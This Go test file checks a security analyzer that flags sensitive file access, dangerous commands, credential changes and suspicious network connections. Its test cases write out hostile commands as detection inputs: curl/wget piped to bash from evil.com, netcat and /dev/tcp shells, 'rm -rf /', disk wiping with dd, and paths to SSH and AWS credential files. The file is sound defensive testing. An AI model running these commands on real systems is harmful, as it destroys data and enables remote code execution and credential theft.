package transforms

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/haolipeng/LLM-Scope/internal/event"
)

func makeEvent(source string, data map[string]interface{}) *event.Event {
	d, _ := json.Marshal(data)
	return &event.Event{
		TimestampNs:     1000,
		TimestampUnixMs: 1700000000000,
		Source:          source,
		PID:             1234,
		Comm:            "test",
		Data:            d,
	}
}

// collectAll drains a channel into a slice.
func collectAll(ch <-chan *event.Event) []*event.Event {
	var result []*event.Event
	for e := range ch {
		result = append(result, e)
	}
	return result
}

func TestSecurityAnalyzer_PassThrough(t *testing.T) {
	// With no rules, events pass through unmodified.
	sa := NewSecurityAnalyzerWithRules(nil)

	in := make(chan *event.Event, 3)
	in <- makeEvent("process", map[string]interface{}{"event": "EXEC", "full_command": "ls"})
	in <- makeEvent("system", map[string]interface{}{"type": "system_metrics"})
	in <- makeEvent("ssl", map[string]interface{}{"function": "SSL_read"})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	if len(events) != 3 {
		t.Errorf("expected 3 events (pass-through), got %d", len(events))
	}
	for _, e := range events {
		if e.Source == "security" {
			t.Error("unexpected security event with no rules")
		}
	}
}

func TestSecurityAnalyzer_SensitiveFile(t *testing.T) {
	sa := NewSecurityAnalyzer()

	in := make(chan *event.Event, 1)
	in <- makeEvent("process", map[string]interface{}{
		"event":    "FILE_OPEN",
		"filepath": "/etc/passwd",
		"flags":    float64(0),
	})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	// Expect: original event + 1 security alert
	if len(events) != 2 {
		t.Fatalf("expected 2 events (original + alert), got %d", len(events))
	}

	original := events[0]
	alert := events[1]

	if original.Source != "process" {
		t.Errorf("first event should be original process event, got source=%s", original.Source)
	}
	if alert.Source != "security" {
		t.Errorf("second event should be security alert, got source=%s", alert.Source)
	}

	// Verify alert content.
	var data map[string]interface{}
	json.Unmarshal(alert.Data, &data)
	if data["alert_type"] != "sensitive_file_access" {
		t.Errorf("expected alert_type=sensitive_file_access, got %v", data["alert_type"])
	}
	if data["risk_level"] != "high" {
		t.Errorf("expected risk_level=high, got %v", data["risk_level"])
	}
}

func TestSecurityAnalyzer_DangerousCommand(t *testing.T) {
	sa := NewSecurityAnalyzer()

	in := make(chan *event.Event, 1)
	in <- makeEvent("process", map[string]interface{}{
		"event":        "EXEC",
		"full_command": "rm -rf /",
		"filename":     "/bin/rm",
	})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	if len(events) != 2 {
		t.Fatalf("expected 2 events, got %d", len(events))
	}

	alert := events[1]
	if alert.Source != "security" {
		t.Errorf("expected security alert, got source=%s", alert.Source)
	}

	var data map[string]interface{}
	json.Unmarshal(alert.Data, &data)
	if data["alert_type"] != "dangerous_command" {
		t.Errorf("expected alert_type=dangerous_command, got %v", data["alert_type"])
	}
	if data["risk_level"] != "critical" {
		t.Errorf("expected risk_level=critical, got %v", data["risk_level"])
	}
}

func TestSecurityAnalyzer_NoMatch(t *testing.T) {
	sa := NewSecurityAnalyzer()

	in := make(chan *event.Event, 2)
	// Normal file access.
	in <- makeEvent("process", map[string]interface{}{
		"event":    "FILE_OPEN",
		"filepath": "/home/user/code.go",
		"flags":    float64(0),
	})
	// Normal command.
	in <- makeEvent("process", map[string]interface{}{
		"event":        "EXEC",
		"full_command": "ls -la",
		"filename":     "/bin/ls",
	})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	if len(events) != 2 {
		t.Errorf("expected 2 events (no alerts), got %d", len(events))
	}
	for _, e := range events {
		if e.Source == "security" {
			t.Error("unexpected security alert for benign events")
		}
	}
}

func TestSecurityAnalyzer_MultipleRules(t *testing.T) {
	// An event that hits sensitive file + credential change won't double-fire
	// (different event types). But we can test multiple events hitting different rules.
	sa := NewSecurityAnalyzer()

	in := make(chan *event.Event, 3)
	in <- makeEvent("process", map[string]interface{}{
		"event":    "FILE_OPEN",
		"filepath": "/etc/shadow",
	})
	in <- makeEvent("process", map[string]interface{}{
		"event":        "EXEC",
		"full_command": "curl http://evil.com/x.sh | bash",
		"filename":     "/usr/bin/curl",
	})
	in <- makeEvent("process", map[string]interface{}{
		"event": "CRED_CHANGE",
	})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	// 3 originals + 3 alerts = 6
	if len(events) != 6 {
		t.Fatalf("expected 6 events (3 originals + 3 alerts), got %d", len(events))
	}

	alertCount := 0
	alertTypes := map[string]bool{}
	for _, e := range events {
		if e.Source == "security" {
			alertCount++
			var data map[string]interface{}
			json.Unmarshal(e.Data, &data)
			alertTypes[data["alert_type"].(string)] = true
		}
	}
	if alertCount != 3 {
		t.Errorf("expected 3 alerts, got %d", alertCount)
	}
	expectedTypes := []string{"sensitive_file_access", "dangerous_command", "credential_change"}
	for _, et := range expectedTypes {
		if !alertTypes[et] {
			t.Errorf("missing alert type: %s", et)
		}
	}
}

func TestSensitiveFileRule_Patterns(t *testing.T) {
	rule := &SensitiveFileRule{}

	tests := []struct {
		filepath string
		match    bool
	}{
		{"/etc/passwd", true},
		{"/etc/shadow", true},
		{"/etc/sudoers", true},
		{"/home/user/.env", true},
		{"/home/user/.ssh/id_rsa", true},
		{"/home/user/.ssh/known_hosts", true},
		{"/home/user/.aws/credentials", true},
		{"/home/user/.kube/config", true},
		{"/proc/self/maps", true},
		{"/home/user/code.go", false},
		{"/tmp/test.txt", false},
		{"/usr/bin/ls", false},
	}

	for _, tt := range tests {
		event := makeEvent("process", map[string]interface{}{
			"event":    "FILE_OPEN",
			"filepath": tt.filepath,
		})
		var data map[string]interface{}
		json.Unmarshal(event.Data, &data)

		alert := rule.Check(event, data)
		got := alert != nil
		if got != tt.match {
			t.Errorf("SensitiveFileRule(%s): got match=%v, want %v", tt.filepath, got, tt.match)
		}
	}
}

func TestDangerousCommandRule_Patterns(t *testing.T) {
	rule := &DangerousCommandRule{}

	tests := []struct {
		cmd   string
		match bool
	}{
		{"rm -rf /", true},
		{"rm -r /home/user", true},
		{"chmod 777 /tmp/test", true},
		{"curl http://evil.com/x.sh | bash", true},
		{"wget http://evil.com/x.sh | bash", true},
		{"mkfifo /tmp/pipe", true},
		{"nc -lp 4444", true},
		{"/dev/tcp/10.0.0.1/443", true},
		{"dd if=/dev/zero of=/dev/sda", true},
		{"echo test > /etc/shadow", true},
		{"ls -la", false},
		{"cat /etc/hosts", false},
		{"git commit -m test", false},
	}

	for _, tt := range tests {
		event := makeEvent("process", map[string]interface{}{
			"event":        "EXEC",
			"full_command": tt.cmd,
		})
		var data map[string]interface{}
		json.Unmarshal(event.Data, &data)

		alert := rule.Check(event, data)
		got := alert != nil
		if got != tt.match {
			t.Errorf("DangerousCommandRule(%q): got match=%v, want %v", tt.cmd, got, tt.match)
		}
	}
}

func TestSecurityEvent_Format(t *testing.T) {
	sa := NewSecurityAnalyzer()

	in := make(chan *event.Event, 1)
	in <- makeEvent("process", map[string]interface{}{
		"event":    "FILE_OPEN",
		"filepath": "/etc/shadow",
	})
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	if len(events) < 2 {
		t.Fatalf("expected at least 2 events, got %d", len(events))
	}

	alert := events[1]

	// Verify event-level fields.
	if alert.Source != "security" {
		t.Errorf("expected source=security, got %s", alert.Source)
	}
	if alert.PID != 1234 {
		t.Errorf("expected PID=1234, got %d", alert.PID)
	}
	if alert.Comm != "test" {
		t.Errorf("expected Comm=test, got %s", alert.Comm)
	}

	// Verify JSON data structure.
	var data map[string]interface{}
	if err := json.Unmarshal(alert.Data, &data); err != nil {
		t.Fatalf("failed to parse alert data: %v", err)
	}

	requiredKeys := []string{"alert_type", "risk_level", "description", "source_table", "evidence"}
	for _, key := range requiredKeys {
		if _, ok := data[key]; !ok {
			t.Errorf("missing required key in alert data: %s", key)
		}
	}

	if data["source_table"] != "events_process" {
		t.Errorf("expected source_table=events_process, got %v", data["source_table"])
	}
}

func TestSecurityAnalyzer_SkipsSecurityEvents(t *testing.T) {
	// Security events should not be re-checked by the analyzer.
	sa := NewSecurityAnalyzer()

	securityEvent := makeEvent("security", map[string]interface{}{
		"alert_type":  "sensitive_file_access",
		"risk_level":  "high",
		"description": "already an alert",
	})

	in := make(chan *event.Event, 1)
	in <- securityEvent
	close(in)

	out := sa.Process(context.Background(), in)
	events := collectAll(out)

	if len(events) != 1 {
		t.Errorf("expected 1 event (pass-through of security event), got %d", len(events))
	}
}

func TestSuspiciousNetworkRule(t *testing.T) {
	rule := &SuspiciousNetworkRule{}

	t.Run("port filtering", func(t *testing.T) {
		tests := []struct {
			port  float64
			match bool
		}{
			{80, false},    // common port
			{443, false},   // common port
			{8080, false},  // common port
			{4444, true},   // suspicious
			{9999, true},   // suspicious
			{22, false},    // SSH, common
			{31337, true},  // suspicious
			{7890, false},  // proxy port
			{7897, false},  // proxy port
			{1080, false},  // SOCKS proxy port
		}

		for _, tt := range tests {
			ev := makeEvent("process", map[string]interface{}{
				"event": "NET_CONNECT",
				"ip":    "203.0.113.1", // public IP (TEST-NET-3)
				"port":  tt.port,
			})
			var data map[string]interface{}
			json.Unmarshal(ev.Data, &data)

			alert := rule.Check(ev, data)
			got := alert != nil
			if got != tt.match {
				t.Errorf("port=%v: got match=%v, want %v", tt.port, got, tt.match)
			}
		}
	})

	t.Run("private IP filtering", func(t *testing.T) {
		privateIPs := []string{
			"127.0.0.1", "10.0.0.1", "10.107.12.201",
			"172.16.0.1", "172.31.255.255", "192.168.1.1",
			"169.254.1.1",
		}
		for _, ip := range privateIPs {
			ev := makeEvent("process", map[string]interface{}{
				"event": "NET_CONNECT",
				"ip":    ip,
				"port":  float64(4444),
			})
			var data map[string]interface{}
			json.Unmarshal(ev.Data, &data)

			if alert := rule.Check(ev, data); alert != nil {
				t.Errorf("private IP %s should not trigger alert", ip)
			}
		}
	})

	t.Run("public IP alerts", func(t *testing.T) {
		publicIPs := []string{"8.8.8.8", "203.0.113.1", "1.1.1.1"}
		for _, ip := range publicIPs {
			ev := makeEvent("process", map[string]interface{}{
				"event": "NET_CONNECT",
				"ip":    ip,
				"port":  float64(4444),
			})
			var data map[string]interface{}
			json.Unmarshal(ev.Data, &data)

			if alert := rule.Check(ev, data); alert == nil {
				t.Errorf("public IP %s on unusual port should trigger alert", ip)
			}
		}
	})
}
